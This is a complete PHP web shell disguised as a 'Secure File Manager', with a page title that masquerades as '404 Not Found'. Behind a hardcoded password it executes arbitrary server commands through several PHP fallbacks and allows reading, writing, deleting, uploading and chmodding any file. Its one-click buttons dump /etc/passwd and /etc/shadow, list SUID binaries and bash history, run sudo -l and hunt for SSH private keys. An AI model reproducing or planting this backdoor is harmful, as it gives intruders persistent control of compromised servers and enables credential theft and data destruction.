<?php
/*
═══════════════════════════════════════════════════════════════════
    🦅 Secure File Manager - Protected Access 🦅
═══════════════════════════════════════════════════════════════════
*/

@error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(0);

// ============ CONFIGURATION ============
$AUTH_PASS = 'r4m1l'; // Şifrəni buradan dəyiş
// =======================================

session_start();

// Authentication check
if (!isset($_SESSION['auth'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $AUTH_PASS) {
        $_SESSION['auth'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        ?>
        <!DOCTYPE html>
        <html>
        <head>
        <meta charset="UTF-8">
        <title>Authentication Required</title>
		<meta name="robots" content="noindex,nofollow">
        <style>
body {
    background: #000;
    display: flex;
    align-items: center;
    justify-content: center;
    height: 100vh;
    font-family: monospace;
}
.login {
    background: #111;
    border: 2px solid darkred;
    padding: 30px;
    border-radius: 10px;
    box-shadow: 0 0 20px rgba(139,0,0,0.3); /* darkred shadow */
}
h2 {
    color: darkred;
    text-align: center;
    margin-bottom: 20px;
}
input {
    width: 100%;
    padding: 12px;
    background: #000;
    border: 1px solid darkred;
    color: darkred;
    font: 14px monospace;
    border-radius: 5px;
    margin-bottom: 15px;
}
button {
    width: 100%;
    padding: 12px;
    background: darkred;
    color: #000;
    border: none;
    font-weight: bold;
    cursor: pointer;
    border-radius: 5px;
    font: 14px monospace;
}
button:hover {
    background: crimson;
}
.eagle {
    font-size: 50px;
    text-align: center;
    margin-bottom: 15px;
}
</style>

        </head>
        <body>
        <div class="login">
        <div class="eagle">🦅</div>
        <h2>Authentication Required</h2>
        <form method="POST">
        <input type="password" name="pass" placeholder="Enter password..." autofocus required>
        <button type="submit">Login</button>
        </form>
        </div>
        </body>
        </html>
        <?php
        exit;
    }
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Execute command
function executeCommand($cmd) {
    $output = '';
    
    if (function_exists('shell_exec')) {
        $output = @shell_exec($cmd . ' 2>&1');
        if ($output !== null) return $output;
    }
    
    if (function_exists('exec')) {
        @exec($cmd . ' 2>&1', $arr);
        return implode("\n", $arr);
    }
    
    if (function_exists('system')) {
        ob_start();
        @system($cmd . ' 2>&1');
        return ob_get_clean();
    }
    
    if (function_exists('passthru')) {
        ob_start();
        @passthru($cmd . ' 2>&1');
        return ob_get_clean();
    }
    
    if (function_exists('proc_open')) {
        $proc = @proc_open($cmd, [
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ], $pipes);
        if (is_resource($proc)) {
            $output = @stream_get_contents($pipes[1]);
            $output .= @stream_get_contents($pipes[2]);
            @fclose($pipes[1]);
            @fclose($pipes[2]);
            @proc_close($proc);
            return $output;
        }
    }
    
    return 'All execution functions are disabled';
}

// Handle actions
if (isset($_POST['action'])) {
    header('Content-Type: application/json');
    $action = $_POST['action'];
    
    // Execute command
    if ($action === 'cmd') {
        echo json_encode(['output' => executeCommand($_POST['command'])]);
        exit;
    }
    
    // List files
    if ($action === 'list') {
        $dir = $_POST['dir'];
        $realDir = realpath($dir);
        if (!$realDir || !is_dir($realDir)) {
            echo json_encode(['error' => 'Invalid directory']);
            exit;
        }
        
        $files = @scandir($realDir);
        $result = [];
        foreach ($files as $file) {
            if ($file === '.' || $file === '..') continue;
            $filepath = $realDir . DIRECTORY_SEPARATOR . $file;
            $result[] = [
                'name' => $file,
                'path' => $filepath,
                'type' => is_dir($filepath) ? 'dir' : 'file',
                'size' => is_file($filepath) ? @filesize($filepath) : 0,
                'perms' => @substr(sprintf('%o', @fileperms($filepath)), -4),
                'modified' => @date('Y-m-d H:i', @filemtime($filepath))
            ];
        }
        echo json_encode(['files' => $result, 'cwd' => $realDir]);
        exit;
    }
    
    // Read file
    if ($action === 'read') {
        $content = @file_get_contents($_POST['file']);
        echo json_encode(['content' => $content !== false ? $content : 'Cannot read file']);
        exit;
    }
    
    // Write file
    if ($action === 'write') {
        $success = @file_put_contents($_POST['file'], $_POST['content']);
        echo json_encode(['success' => $success !== false]);
        exit;
    }
    
    // Delete file/dir
    if ($action === 'delete') {
        $path = $_POST['path'];
        $success = false;
        if (is_file($path)) {
            $success = @unlink($path);
        } elseif (is_dir($path)) {
            $success = @rmdir($path);
        }
        echo json_encode(['success' => $success]);
        exit;
    }
    
    // Upload file
    if ($action === 'upload' && isset($_FILES['file'])) {
        $target = $_POST['uploadDir'] . DIRECTORY_SEPARATOR . $_FILES['file']['name'];
        $success = @move_uploaded_file($_FILES['file']['tmp_name'], $target);
        echo json_encode(['success' => $success]);
        exit;
    }
    
    // Download file
    if ($action === 'download') {
        $file = $_POST['file'];
        if (is_file($file)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            header('Content-Length: ' . filesize($file));
            readfile($file);
        }
        exit;
    }
    
    // Rename
    if ($action === 'rename') {
        $success = @rename($_POST['old'], $_POST['new']);
        echo json_encode(['success' => $success]);
        exit;
    }
    
    // Chmod
    if ($action === 'chmod') {
        $success = @chmod($_POST['file'], octdec($_POST['perms']));
        echo json_encode(['success' => $success]);
        exit;
    }
    
    // Create file
    if ($action === 'newfile') {
        $path = $_POST['dir'] . DIRECTORY_SEPARATOR . $_POST['name'];
        $success = @touch($path);
        echo json_encode(['success' => $success]);
        exit;
    }
    
    // Create directory
    if ($action === 'newdir') {
        $path = $_POST['dir'] . DIRECTORY_SEPARATOR . $_POST['name'];
        $success = @mkdir($path, 0755);
        echo json_encode(['success' => $success]);
        exit;
    }
}

$cwd = getcwd();
$sysInfo = [
    'OS' => PHP_OS,
    'User' => @get_current_user(),
    'UID' => @getmyuid(),
    'Server' => @gethostname(),
    'PHP' => phpversion(),
    'CWD' => $cwd
];
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>404 Not Found</title>
<meta name="robots" content="noindex,nofollow">
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}
body {
    background: linear-gradient(135deg, #000, #1a1a1a);
    color: darkred;
    font: 13px 'Courier New', monospace;
    padding: 10px;
    min-height: 100vh;
}
.container {
    max-width: 1400px;
    margin: 0 auto;
}
.header {
    text-align: center;
    padding: 20px;
    border-bottom: 2px solid darkred;
    margin-bottom: 20px;
    background: rgba(139,0,0,0.05);
    border-radius: 10px;
    position: relative;
}
.logout {
    position: absolute;
    right: 20px;
    top: 20px;
    background: darkred;
    color: #000;
    padding: 8px 15px;
    border-radius: 5px;
    text-decoration: none;
    font-weight: bold;
    font-size: 12px;
}
.logout:hover {
    background: crimson;
}
.eagle { font-size: 50px; }
.title { font-size: 18px; margin-top: 10px; font-weight: bold; }
.info-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit,minmax(180px,1fr));
    gap: 10px;
    margin-bottom: 20px;
    background: rgba(139,0,0,0.05);
    padding: 15px;
    border: 1px solid darkred;
    border-radius: 10px;
}
.info-item {
    padding: 10px;
    background: rgba(0,0,0,0.5);
    border-left: 3px solid darkred;
}
.info-label { font-size: 11px; font-weight: bold; color: darkred; }
.info-value { font-size: 12px; color: #fff; word-wrap: break-word; }
.tabs { display: flex; gap: 8px; margin-bottom: 20px; flex-wrap: wrap; }
.tab {
    background: #111;
    border: 1px solid darkred;
    color: darkred;
    padding: 10px 20px;
    cursor: pointer;
    border-radius: 5px;
    transition: .3s;
    font-weight: bold;
}
.tab:hover, .tab.active {
    background: darkred;
    color: #000;
}
.section {
    display: none;
    background: rgba(139,0,0,0.05);
    border: 1px solid darkred;
    border-radius: 10px;
    padding: 20px;
}
.section.active { display: block; }
.path-nav {
    background: #111;
    padding: 12px;
    border-radius: 5px;
    margin-bottom: 15px;
    display: flex;
    align-items: center;
    gap: 8px;
    flex-wrap: wrap;
}
.path-nav a {
    color: darkred;
    text-decoration: none;
    padding: 5px 10px;
    background: #222;
    border-radius: 3px;
    font-size: 12px;
    transition: .2s;
}
.path-nav a:hover { background: darkred; color: #000; }
.file-list {
    list-style: none;
    max-height: 500px;
    overflow-y: auto;
    border: 1px solid darkred;
    border-radius: 5px;
    background: #000;
    padding: 10px;
}
.file-item {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 10px;
    margin: 5px 0;
    background: #111;
    border-radius: 5px;
    cursor: pointer;
    transition: .2s;
}
.file-item:hover { background: #222; transform: translateX(5px); }
.file-name { flex: 1; color: darkred; font-size: 13px; }
.file-meta { font-size: 11px; color: #666; margin-top: 3px; }
.file-actions { display: flex; gap: 5px; }
.btn {
    background: darkred;
    color: #000;
    border: none;
    padding: 6px 12px;
    cursor: pointer;
    border-radius: 3px;
    font-size: 11px;
    font-weight: bold;
    transition: .2s;
}
.btn:hover { background: crimson; transform: scale(1.05); }
.btn-secondary { background: #666; color: #fff; }
.btn-secondary:hover { background: #888; }
.input-group { display: flex; gap: 10px; margin-bottom: 15px; }
.input-group input, .input-group textarea {
    flex: 1;
    background: #000;
    border: 1px solid darkred;
    color: darkred;
    padding: 10px;
    font: 13px 'Courier New', monospace;
    border-radius: 5px;
}
.input-group textarea { min-height: 350px; font-size: 12px; }
.terminal {
    background: #000;
    border: 1px solid darkred;
    border-radius: 5px;
    padding: 15px;
    min-height: 400px;
    max-height: 600px;
    overflow-y: auto;
    color: #fff;
    white-space: pre-wrap;
    word-wrap: break-word;
    font: 12px 'Courier New', monospace;
    line-height: 1.6;
}
.quick-commands { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 12px; }
.quick-cmd {
    background: rgba(139,0,0,0.1);
    border: 1px solid darkred;
    color: darkred;
    padding: 6px 12px;
    cursor: pointer;
    border-radius: 3px;
    font-size: 11px;
    transition: .2s;
}
.quick-cmd:hover { background: rgba(139,0,0,0.2); transform: translateY(-2px); }
::-webkit-scrollbar { width: 8px; height: 8px; }
::-webkit-scrollbar-track { background: #000; }
::-webkit-scrollbar-thumb { background: darkred; border-radius: 4px; }
.upload-area {
    border: 2px dashed darkred;
    padding: 30px;
    text-align: center;
    border-radius: 5px;
    background: rgba(139,0,0,0.02);
}
.upload-result {
    margin-top: 15px;
    padding: 10px;
    background: #111;
    border-radius: 5px;
    color: darkred;
}
</style>

</head>
<body>
<div class="container">
<div class="header">
<a href="?logout=1" class="logout">Logout</a>
<div class="eagle">🦅</div>
<div class="title">ig,tg: r4m1l</div>
</div>

<div class="info-grid">
<?php foreach ($sysInfo as $label => $value): ?>
<div class="info-item">
<div class="info-label"><?= $label ?>:</div>
<div class="info-value"><?= htmlspecialchars($value) ?></div>
</div>
<?php endforeach; ?>
</div>

<div class="tabs">
<div class="tab active" onclick="switchTab('shell')">💻 Shell</div>
<div class="tab" onclick="switchTab('files')">📁 Files</div>
<div class="tab" onclick="switchTab('editor')">📝 Editor</div>
<div class="tab" onclick="switchTab('upload')">⬆️ Upload</div>
<div class="tab" onclick="switchTab('tools')">🛠️ Tools</div>
</div>

<div id="shell" class="section active">
<div class="quick-commands">
<span class="quick-cmd" onclick="setCmd('id')">id</span>
<span class="quick-cmd" onclick="setCmd('whoami')">whoami</span>
<span class="quick-cmd" onclick="setCmd('pwd')">pwd</span>
<span class="quick-cmd" onclick="setCmd('ls -la')">ls -la</span>
<span class="quick-cmd" onclick="setCmd('uname -a')">uname</span>
<span class="quick-cmd" onclick="setCmd('ps aux | head -20')">ps aux</span>
<span class="quick-cmd" onclick="setCmd('netstat -tulpn')">netstat</span>
<span class="quick-cmd" onclick="setCmd('cat /etc/passwd')">passwd</span>
<span class="quick-cmd" onclick="setCmd('find / -perm -4000 2>/dev/null | head -20')">SUID</span>
<span class="quick-cmd" onclick="setCmd('cat ~/.bash_history')">history</span>
</div>
<div class="input-group">
<input type="text" id="cmdInput" placeholder="Enter command..." onkeypress="if(event.key==='Enter')execCmd()">
<button class="btn" onclick="execCmd()">Execute</button>
<button class="btn btn-secondary" onclick="clearTerminal()">Clear</button>
</div>
<div class="terminal" id="terminal">Welcome to Shell Terminal. Enter a command above...</div>
</div>

<div id="files" class="section">
<div class="path-nav" id="pathNav"></div>
<div class="input-group">
<input type="text" id="newFileName" placeholder="New file name">
<button class="btn" onclick="createFile()">Create File</button>
<input type="text" id="newDirName" placeholder="New directory name">
<button class="btn" onclick="createDir()">Create Dir</button>
</div>
<ul class="file-list" id="fileList"></ul>
</div>

<div id="editor" class="section">
<div class="input-group">
<input type="text" id="editorPath" placeholder="File path...">
<button class="btn" onclick="loadFile()">Load</button>
<button class="btn" onclick="saveFile()">Save</button>
</div>
<div class="input-group">
<textarea id="editorContent"></textarea>
</div>
</div>

<div id="upload" class="section">
<div class="upload-area">
<input type="file" id="uploadFile">
<button class="btn" onclick="uploadFile()" style="margin-top:15px">Upload File</button>
</div>
<div class="upload-result" id="uploadResult"></div>
</div>

<div id="tools" class="section">
<div style="padding:20px;text-align:center">
<h3 style="color:#a80202;margin-bottom:20px">Quick Tools</h3>
<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:15px">
<button class="btn" style="padding:15px" onclick="quickTool('find / -writable 2>/dev/null | head -30')">Find Writable</button>
<button class="btn" style="padding:15px" onclick="quickTool('sudo -l')">Sudo -l</button>
<button class="btn" style="padding:15px" onclick="quickTool('cat /etc/shadow')">Shadow</button>
<button class="btn" style="padding:15px" onclick="quickTool('ps aux | grep root')">Root Processes</button>
<button class="btn" style="padding:15px" onclick="quickTool('netstat -tulpn | grep LISTEN')">Listening Ports</button>
<button class="btn" style="padding:15px" onclick="quickTool('find /home -name \"*id_rsa*\" 2>/dev/null')">SSH Keys</button>
</div>
</div>
</div>

</div>

<script>
let currentDir = '<?= addslashes($cwd) ?>';

function request(data, callback) {
    fetch('', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: new URLSearchParams(data)
    })
    .then(r => r.json())
    .then(callback)
    .catch(e => {
        console.error(e);
        alert('Request failed: ' + e.message);
    });
}

function switchTab(tab) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
    event.target.classList.add('active');
    document.getElementById(tab).classList.add('active');
    if (tab === 'files') loadFiles();
}

function execCmd() {
    let cmd = document.getElementById('cmdInput').value;
    if (!cmd) return;
    
    let term = document.getElementById('terminal');
    term.innerHTML += '\n$ ' + cmd + '\n';
    term.scrollTop = term.scrollHeight;
    
    request({action: 'cmd', command: cmd}, data => {
        term.innerHTML += data.output + '\n';
        term.scrollTop = term.scrollHeight;
    });
    
    document.getElementById('cmdInput').value = '';
}

function setCmd(cmd) {
    document.getElementById('cmdInput').value = cmd;
    document.getElementById('cmdInput').focus();
    switchTab('shell');
}

function quickTool(cmd) {
    setCmd(cmd);
    execCmd();
}

function clearTerminal() {
    document.getElementById('terminal').innerHTML = 'Terminal cleared.\n';
}

function loadFiles() {
    request({action: 'list', dir: currentDir}, response => {
        if (response.error) {
            alert(response.error);
            return;
        }
        
        currentDir = response.cwd;
        let files = response.files;
        
        // Build path navigation
        let parts = currentDir.split('/').filter(p => p);
        let pathHtml = '<a href="#" onclick="changeDir(\'/\');return false">/</a>';
        let path = '';
        parts.forEach(p => {
            path += '/' + p;
            let currentPath = path;
            pathHtml += `<a href="#" onclick="changeDir('${currentPath}');return false">${p}</a>`;
        });
        document.getElementById('pathNav').innerHTML = pathHtml;
        
        // Build file list
        let html = '';
        
        // Parent directory (..)
        if (currentDir !== '/') {
            let up = currentDir.split('/').slice(0, -1).join('/') || '/';
            html += `<li class="file-item" onclick="changeDir('${up}')">
                <div><span class="file-name">📁 ..</span></div>
            </li>`;
        }
        
        files.forEach(f => {
            let click = f.type === 'dir' ? `onclick="changeDir('${f.path}')"` : '';
            let actions = f.type === 'file' ? 
                `<button class="btn" onclick="event.stopPropagation();editFile('${f.path}')">Edit</button>
                 <button class="btn" onclick="event.stopPropagation();downloadFile('${f.path}')">Down</button>` : '';
            
            html += `<li class="file-item" ${click}>
                <div style="flex:1">
                    <div class="file-name">${f.type === 'dir' ? '📁' : '📄'} ${f.name}</div>
                    <div class="file-meta">${formatSize(f.size)} | ${f.perms} | ${f.modified}</div>
                </div>
                <div class="file-actions" onclick="event.stopPropagation()">
                    ${actions}
                    <button class="btn btn-secondary" onclick="deleteFile('${f.path}')">Del</button>
                </div>
            </li>`;
        });
        
        document.getElementById('fileList').innerHTML = html;
    });
}

function changeDir(dir) {
    currentDir = dir;
    loadFiles();
}

function formatSize(bytes) {
    if (!bytes) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return (bytes / Math.pow(k, i)).toFixed(1) + ' ' + sizes[i];
}

function editFile(path) {
    document.getElementById('editorPath').value = path;
    switchTab('editor');
    setTimeout(() => loadFile(), 100);
}

function loadFile() {
    let path = document.getElementById('editorPath').value;
    if (!path) return alert('Enter file path');
    request({action: 'read', file: path}, data => {
        document.getElementById('editorContent').value = data.content;
    });
}

function saveFile() {
    let path = document.getElementById('editorPath').value;
    let content = document.getElementById('editorContent').value;
    if (!path) return alert('Enter file path');
    request({action: 'write', file: path, content: content}, data => {
        alert(data.success ? 'File saved!' : 'Save failed');
    });
}

function deleteFile(path) {
    if (!confirm('Delete ' + path + '?')) return;
    request({action: 'delete', path: path}, data => {
        alert(data.success ? 'Deleted' : 'Failed');
        loadFiles();
    });
}

function downloadFile(path) {
    let form = document.createElement('form');
    form.method = 'POST';
    form.innerHTML = `<input name="action" value="download"><input name="file" value="${path}">`;
    document.body.appendChild(form);
    form.submit();
    document.body.removeChild(form);
}

function createFile() {
    let name = document.getElementById('newFileName').value;
    if (!name) return alert('Enter file name');
    request({action: 'newfile', name: name, dir: currentDir}, data => {
        alert(data.success ? 'Created' : 'Failed');
        document.getElementById('newFileName').value = '';
        loadFiles();
    });
}

function createDir() {
    let name = document.getElementById('newDirName').value;
    if (!name) return alert('Enter directory name');
    request({action: 'newdir', name: name, dir: currentDir}, data => {
        alert(data.success ? 'Created' : 'Failed');
        document.getElementById('newDirName').value = '';
        loadFiles();
    });
}

function uploadFile() {
    let file = document.getElementById('uploadFile').files[0];
    if (!file) return alert('Select a file');
    
    let formData = new FormData();
    formData.append('action', 'upload');
    formData.append('uploadDir', currentDir);
    formData.append('file', file);
    
    fetch('', {method: 'POST', body: formData})
    .then(r => r.json())
    .then(data => {
        document.getElementById('uploadResult').innerHTML = 
            data.success ? '✅ File uploaded successfully!' : '❌ Upload failed';
        loadFiles();
    });
}

// Initial load
loadFiles();
</script>
</body>
</html>
